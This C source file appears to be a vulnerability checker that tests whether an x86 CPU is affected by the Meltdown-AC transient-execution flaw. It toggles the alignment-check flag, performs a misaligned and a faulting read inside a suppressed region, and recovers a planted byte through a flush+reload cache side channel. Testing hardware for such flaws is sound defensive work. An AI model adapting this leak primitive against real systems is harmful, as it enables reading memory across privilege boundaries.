#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "libcache/cache.h"
#include "lib/global.h"

#if defined(__i386__)
  #define ENABLE_AC 					\
    __asm__("pushf\norl $0x40000,(%esp)\npopf")
  #define DISABLE_AC 					\
    __asm__("pushf\nandl $~(0x40000),(%esp)\npopf")
#else
  #define ENABLE_AC 					\
    __asm__("pushf\norl $0x40000,(%rsp)\npopf")
  #define DISABLE_AC 					\
    __asm__("pushf\nandl $~(0x40000),(%rsp)\npopf")
#endif

int main(int argc, char **argv)
{
    // 准备阶段
    PREPARE();

    printf("Meltdown_AC Begins...\n");

// exploit gen
#ifdef EXPLOIT_VAR
    char *buffer;
    int *p;
    buffer = (char *)malloc(sizeof(int) + 1);
    buffer++;
    *buffer = rand() % ('~' - ' ' + 1) + ' ';
    // printf("%c\n", *buffer);
    p = (int *)buffer;
#else
    char *buffer;
    int *p;
    buffer = (char *)malloc(sizeof(int) + 1);
    buffer++;
    *buffer = 's';
    p = (int *)buffer;
#endif
    for (int i = 0; i < MAX_TRY_TIMES; i++)
    {
        // attack
        flush_shared_memory();
#if defined(__i386__) || defined(__x86_64__)
        ENABLE_AC;
#endif
        if (try_start())
        {
            // maccess(buffer);
            maccess(0);
            // maccess(1);
            cache_encode(*p);
            try_abort();
        }
        try_end();
#if defined(__i386__) || defined(__x86_64__)
        DISABLE_AC;
#endif
        // flush+reload
        // printf("%c", cache_decode());
        if (cache_decode() == *buffer)
        {
            passed_count++;
        }
    }

    // printf("%lf\n", (double)passed_count/MAX_TRY_TIMES);
    if ((double)passed_count / MAX_TRY_TIMES > 0.3)
    {
        printf(ANSI_COLOR_RED "Meltdown_AC: Vulnerable\n" ANSI_COLOR_RESET);
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Meltdown_AC: Not Vulnerable\n" ANSI_COLOR_RESET);
    }
    // clean
    printf("Meltdown_AC Done!\n\n");
}